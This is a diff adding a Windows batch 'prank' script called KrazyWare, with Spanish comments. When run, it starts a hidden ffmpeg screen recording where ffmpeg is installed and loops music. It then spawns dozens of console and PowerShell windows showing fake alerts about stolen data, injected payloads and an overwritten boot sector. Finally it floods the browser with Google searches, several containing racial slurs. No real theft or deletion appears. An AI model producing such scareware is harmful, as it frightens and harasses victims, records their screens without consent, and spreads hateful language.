@@ -1,0 +1,520 @@
+��&cls
+��&cls
+@echo off
+title KrazyWareeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee!!!!!!!!!!
+color 0A
+
+:: ⚙️ CONFIGURACIÓN
+set PASSWORD=Krazy
+set CARPETA_TXT=%TEMP%\KrazyNigga
+set CARPETA_GRABACION=%USERPROFILE%\Videos\KrazyNigga
+set RUTA_CANCION=C:\KrazyNigga\musica.mp3
+set SEGUNDOS_CAOS=480
+
+:: Crear carpetas
+if not exist "%CARPETA_TXT%" mkdir "%CARPETA_TXT%"
+if not exist "%CARPETA_GRABACION%" mkdir "%CARPETA_GRABACION%"
+
+:: ============================================
+:: FASE 1: Grabación de pantalla (opcional)
+:: ============================================
+where ffmpeg >nul 2>nul
+if %errorlevel%==0 (
+    start "" /min cmd /c "ffmpeg -f gdigrab -framerate 15 -i desktop -t 500 -y "%CARPETA_GRABACION%\broma_%RANDOM%.mp4""
+)
+
+timeout /t 1 >nul
+
+:: ============================================
+:: FASE 2: Música
+:: ============================================
+if exist "%RUTA_CANCION%" (
+    start "" /min powershell -WindowStyle Hidden -Command ^
+    "$p = New-Object Media.SoundPlayer '%RUTA_CANCION%'; $p.PlayLooping()"
+)
+
+:: ============================================
+:: FASE 3: Caos visual (tus textos originales)
+:: ============================================
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+start "" cmd /c "color 0C && title ALERTA: Virus detectado && echo Stealer info. && echo Looking in your device && dir /s C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0E && title SYSTEM BREACH && echo Nigga Skider && tree C:\ && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0A && title Stealer in proggres && echo ████████████░░░░░░░░ 60%% && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0D && title KrazyWare activo && echo Inyectando payload... && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0B && title DATOS ENVIADOS && echo 2.4 GB transmitidos && timeout /t 120 >nul"
+timeout /t 1 >nul
+start "" cmd /c "color 0C && title ERROR CRITICO && echo Fallo de seguridad detectado && timeout /t 120 >nul"
+
+start "" powershell -Command "Write-Host 'INICIANDO PROTOCOLO DE EMERGENCIA...' -ForegroundColor Red; Start-Sleep 2; Write-Host 'ACCESO DENEGADO' -ForegroundColor Red; Write-Host 'CONTRASENA REQUERIDA' -ForegroundColor Yellow; Start-Sleep 120"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[!] Procesando archivo ' + $_ + '...') -ForegroundColor Green; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "1..150 | ForEach-Object { Write-Host ('[X] Eliminando registro ' + $_) -ForegroundColor DarkRed; Start-Sleep -Milliseconds 400 }"
+timeout /t 1 >nul
+start "" powershell -Command "Write-Host 'SOBREESCRIBIENDO SECTOR DE ARRANQUE...' -ForegroundColor Red; Start-Sleep 3; Write-Host '50%% completado...' -ForegroundColor Yellow; Start-Sleep 120"
+
+
+:: Herramientas del sistema
+start "" taskmgr
+timeout /t 1 >nul
+start "" notepad
+timeout /t 1 >nul
+start "" calc
+timeout /t 1 >nul
+
+:: ============================================
+:: FASE 4: Búsquedas en el navegador
+:: ============================================
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=que+chingados+le+pasa+a+mi+pc"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=lol+me+comi+un+.bat+que+estupido"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=mi+pc+esta+hackeada+que+hago"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=como+quitar+virus+urgente"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=ayuda+mi+computadora+esta+poseida"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=soy+nigga"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+mi+viejosabroso"
+timeout /t 2 >nul
+start "" "https://www.google.com/search?q=Krazy+me+esta+hackeando"
